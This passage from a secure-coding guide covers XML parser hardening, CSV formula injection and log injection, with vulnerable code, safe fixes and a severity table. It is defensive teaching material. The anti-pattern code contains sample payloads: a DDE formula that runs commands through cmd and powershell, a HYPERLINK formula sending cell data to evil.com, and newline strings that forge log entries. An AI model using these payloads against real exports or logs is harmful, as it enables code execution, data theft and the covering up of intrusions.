  factory.setXIncludeAware(false);
  factory.setExpandEntityReferences(false);
  DocumentBuilder builder = factory.newDocumentBuilder();
  return builder.parse(new InputSource(new StringReader(xml)));
}
```

### Why It Works

Disabling DTD declarations entirely (`disallow-doctype-decl`) is the strongest defense — without DTDs, there are no entities to resolve. When DTDs are required (rare in modern applications), the per-feature disable list ensures external resolution is off and only inline entities are honored. `defusedxml` is the Python community's accepted safe-parser library; `OWASP Java XML Security` libraries provide equivalent hardening for Java. The XInclude and entity-expansion flags catch the secondary attack classes (XInclude can fetch external content; entity expansion is the billion-laughs primitive).

**Additional considerations:** *Cross-reference to deserialization.* Deserialization safety for non-XML formats (pickle, YAML, JSON-with-schema) is covered by `security-input-validation` Rule 5.4. XML is in this skill because the XXE failure is an *output-context* issue (the parser's interpretation of the XML document), not a validation issue at the input boundary — the parser is the interpreter, and we encode (or rather, refuse to expand) for it. *SOAP and XML-based APIs.* Legacy SOAP services and XML-RPC are common XXE surfaces; the same parser hardening applies. *XSLT and XPath.* XSLT processors and XPath engines have similar external-entity surface — apply the equivalent hardening (`javax.xml.transform.TransformerFactory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true)` for Java).

---

## AP-9: CSV Formula Injection on Export

### Anti-Pattern

```python
# Python — direct CSV export of user-supplied data
import csv

def export_users(users: list[dict], output_path: str):
    with open(output_path, 'w', newline='') as f:
        writer = csv.writer(f)
        writer.writerow(['Name', 'Email', 'Bio'])
        for user in users:
            # Attacker user.name = "=cmd|'/c calc'!A1"
            # When admin opens the CSV in Excel, the formula executes
            writer.writerow([user['name'], user['email'], user['bio']])
```

```typescript
// Node — CSV export without formula-leading escape
import { stringify } from 'csv-stringify/sync';

function exportUsers(users: User[]): string {
  // csv-stringify quotes commas correctly but does not escape =, +, -, @
  return stringify(
    users.map(u => [u.name, u.email, u.bio]),
    { header: true, columns: ['Name', 'Email', 'Bio'] },
  );
}
```

```python
# Even with proper RFC 4180 quoting, formula chars at field start are dangerous
import csv

def export_payroll(rows: list[list[str]], output_path: str):
    # csv.writer quotes commas, newlines, quotes — but not the formula leading chars
    with open(output_path, 'w', newline='') as f:
        writer = csv.writer(f, quoting=csv.QUOTE_ALL)
        writer.writerows(rows)
    # Attacker payload in any field: "=HYPERLINK("http://evil.com?d="&A2&B2,"Click")"
```

### Why It Fails

CSV is plain text; spreadsheet applications (Excel, Google Sheets, LibreOffice Calc, Numbers) interpret fields whose first character is `=`, `+`, `-`, `@`, `\t` (tab), or `\0` (null) as formulas. A field value `=cmd|'/c calc'!A1` looks like data in the CSV file but executes the Windows `calc.exe` (or worse — `=cmd|'/c powershell -enc ...'!A1`) when the file is opened. `=HYPERLINK` and `=WEBSERVICE` formulas exfiltrate data to attacker-controlled URLs without code execution.

The attack is *deferred* — the CSV file looks innocent when generated, the application stores it, the admin downloads and opens it days later, and the formula executes in the admin's spreadsheet application. The application that wrote the CSV is the proximate cause; the spreadsheet is the actual executor.

Many CSV-writing libraries follow RFC 4180 §2.6 (escape `,`, `"`, newline by wrapping in quotes and doubling internal quotes) but *do not* escape formula-leading characters because they're not part of RFC 4180's strict scope. The leading-character escape is RFC 4180 §2.7 plus widespread practical convention.

**Source for failure mode:** `OWASP-ASVS V1.2.10` (CSV / formula injection, RFC 4180 escaping); `OWASP-CHEAT-INJECTION` (related); `CWE-1236` (Improper Neutralization of Formula Elements in a CSV File).

### Canonical Pattern

```python
# Python — escape formula-leading characters
import csv

FORMULA_CHARS = ('=', '+', '-', '@', '\t', '\r')

def safe_csv_field(value) -> str:
    if value is None:
        return ''
    s = str(value)
    if s and s[0] in FORMULA_CHARS:
        return "'" + s  # single-quote prefix breaks formula interpretation
    return s

def export_users(users: list[dict], output_path: str):
    with open(output_path, 'w', newline='') as f:
        writer = csv.writer(f, quoting=csv.QUOTE_ALL)
        writer.writerow(['Name', 'Email', 'Bio'])
        for user in users:
            writer.writerow([
                safe_csv_field(user['name']),
                safe_csv_field(user['email']),
                safe_csv_field(user['bio']),
            ])
```

```typescript
// Node — escape formula-leading characters before stringify
const FORMULA_CHARS = new Set(['=', '+', '-', '@', '\t', '\r']);

function safeCsvField(value: unknown): string {
  if (value == null) return '';
  const s = String(value);
  if (s.length > 0 && FORMULA_CHARS.has(s[0])) {
    return "'" + s;
  }
  return s;
}

function exportUsers(users: User[]): string {
  return stringify(
    users.map(u => [safeCsvField(u.name), safeCsvField(u.email), safeCsvField(u.bio)]),
    { header: true, columns: ['Name', 'Email', 'Bio'] },
  );
}
```

### Why It Works

The single-quote prefix is interpreted by spreadsheet software as "treat the rest of this cell as text, not formula." The visible cell content shows `=cmd|...` as text rather than executing it. The escape is applied per-field at write time; it's idempotent (escaping a field that doesn't start with a formula character is a no-op via the conditional).

**Additional considerations:** *XLSX and ODS formats.* The same risk applies to native spreadsheet formats; library-specific escape (openpyxl, xlsxwriter, Apache POI) is similar — verify the library's behavior or apply the same field-level escape before writing. *The single-quote prefix is visible.* Some applications prefer to wrap the entire field in quotes and prepend a space, or to use a tab character before the formula char — both work; the single-quote convention is the most common. *Defense at consumption.* Real defense against formula injection happens both at export (this rule) *and* at consumption (instruct users not to open untrusted CSVs in Excel; configure Excel to prompt on formula execution from external data); the export-side defense is the application's responsibility.

---

## AP-10: Log Injection via Unencoded CR/LF in User-Controlled Log Content

### Anti-Pattern

```python
# Python — f-string log line with raw user content
import logging
logger = logging.getLogger(__name__)

def login(username: str, success: bool):
    # Attacker username = "alice\nINFO: admin promoted to superuser"
    # The CR/LF in the username forges a second log line
    logger.info(f"Login attempt: user={username} success={success}")
```

```typescript
// Node — template literal log line with raw user content
function recordAction(req: Request, action: string) {
  // Attacker sends "logout\n2026-05-22 INFO: admin granted root"
  // in the action field
  logger.info(`User ${req.user.id} performed ${action}`);
}
```

```java
// Java — string-concat log line
private static final Logger log = LoggerFactory.getLogger(MyService.class);

public void processRequest(String userInput) {
  log.info("Received request from " + userInput);
  // Attacker userInput = "alice\r\n2026-05-22 ERROR: database wiped"
  // forges a fake error entry in the centralized log aggregation
}
```

### Why It Fails

Log lines are typically newline-delimited; log aggregation systems (CloudWatch, Splunk, Datadog, ELK) parse each line as a separate entry. User-controlled content containing CR (`\r`), LF (`\n`), or both injected into a log message forges new lines that the aggregator parses as separate entries with attacker-chosen timestamps, severities, and content. The attacker uses this to:

- Hide their tracks by inserting fake "successful login" entries
- Frame other users by injecting their identifiers into incident-related log lines
- Confuse incident-response by injecting fake error / panic entries
- Exfiltrate data via log content (CR/LF + carefully chosen content reaches SIEM systems with parsing rules that match on field positions)

Beyond CR/LF, control characters can corrupt terminal output if the log is ever viewed via `cat` / `less` (ANSI escape sequences inject formatting or fake content) — a smaller concern in modern aggregation pipelines but real for legacy logging.

**Source for failure mode:** `OWASP-ASVS V16` (Security Logging — cross-reference); `CWE-117` (Improper Output Neutralization for Logs). Cross-reference to `security-logging` (Phase 6) for the broader logging discipline (sensitive-data scrubbing, retention, alerting).

### Canonical Pattern

```python
# Python — structured logging (the structured-field API handles encoding)
import structlog
logger = structlog.get_logger()

def login(username: str, success: bool):
    # Structured fields are encoded as JSON keys/values; no positional concatenation
    logger.info("login_attempt", username=username, success=success)
```

```python
# Python — manual CR/LF removal if structured logging isn't available
import logging
import re

logger = logging.getLogger(__name__)
_LOG_SAFE = re.compile(r'[\r\n\x00-\x1f\x7f]')

def safe_log(value) -> str:
    """Strip control characters from user-controlled log content."""
    if value is None:
        return ''
    return _LOG_SAFE.sub('', str(value))

def login(username: str, success: bool):
    logger.info("Login attempt: user=%s success=%s", safe_log(username), success)
```

```typescript
// Node — structured logging via pino
import pino from 'pino';
const logger = pino();

function recordAction(req: Request, action: string) {
  // Structured fields — JSON-encoded, no positional concat
  logger.info({ userId: req.user.id, action }, 'user_action');
}
```

```java
// Java — SLF4J parameterized log (structured field encoding)
private static final Logger log = LoggerFactory.getLogger(MyService.class);

public void processRequest(String userInput) {
  // SLF4J's {} placeholders handle the parameter encoding;
  // pair with a logging encoder that JSON-encodes structured fields
  log.info("Received request from {}", sanitizeForLog(userInput));
}

private static String sanitizeForLog(String s) {
  if (s == null) return "";
  return s.replaceAll("[\\r\\n\\x00-\\x1f\\x7f]", "");
}
```

### Why It Works

Structured logging encodes each field as a key-value pair in JSON (or another structured format) before emission. CR/LF inside a field value is JSON-escaped (`\\n`, `\\r`) and remains in the field as literal text — it cannot terminate the log entry because the entry boundary is the JSON object boundary, not a newline character. The aggregator parses the JSON and gets the original field value, not a forged entry.

When structured logging isn't available (legacy code, plain-text log aggregators), explicit CR/LF stripping at the encode boundary defeats the forging attack. The `safeLog` / `sanitizeForLog` helpers strip control characters before the value reaches the log emission call.

**Additional considerations:** *Cross-reference to `security-logging` (Phase 6).* Log injection is the encoding-side concern (CWE-117); the broader logging discipline — sensitive-data scrubbing (don't log passwords / tokens), retention, integrity, alerting on log gaps — lives in `security-logging`. *ANSI escape filtering.* For logs that are ever viewed via terminal (development environments, on-call ssh sessions), strip `\x1b` (escape) and related control sequences to prevent terminal hijack. *Centralized aggregation as backstop.* Modern SIEM systems often parse log content as bytes and don't trust newline boundaries — they're a partial defense against forging if combined with structured logging. The application-side encoding is still required because not all logs reach the SIEM directly (file-tail pipelines, agent-side parsing, log shipping with newline-as-delimiter).

---

## Summary

| AP | Title | Primary Rule | Severity |
|----|-------|--------------|----------|
| AP-1 | SQL via string concat / f-string / template literal | Rule 5.2 | Critical |
| AP-2 | ORM "always safe" + raw-query escape hatch | Rule 5.2 | Critical |
| AP-3 | `dangerouslySetInnerHTML` / `v-html` / unsafe sinks | Rule 5.3 | High–Critical |
| AP-4 | Manual HTML escape via `str.replace` | Rule 5.3 | High |
| AP-5 | URL via concat; no safe-protocol allow-list | Rule 5.4 | High |
| AP-6 | Shell-string spawn (`exec`, `shell=True`, `bash -c`) | Rule 5.5 | Critical |
| AP-7 | LDAP filter built via string concatenation | Rule 5.6 | Critical |
| AP-8 | XML parser with XXE enabled by default | Rule 5.7 | High–Critical |
| AP-9 | CSV formula injection on export | Rule 5.7 | Medium–High |
| AP-10 | Log injection via unencoded CR/LF | Rule 5.7 | Medium |

Severity is the typical range; actual severity depends on the change context (e.g., AP-1 in a public-facing endpoint querying PII data is Critical; AP-1 in an internal-only admin tool against non-sensitive data is High). DISAGREEMENT Rule 5.2 routes severity for findings raised here.
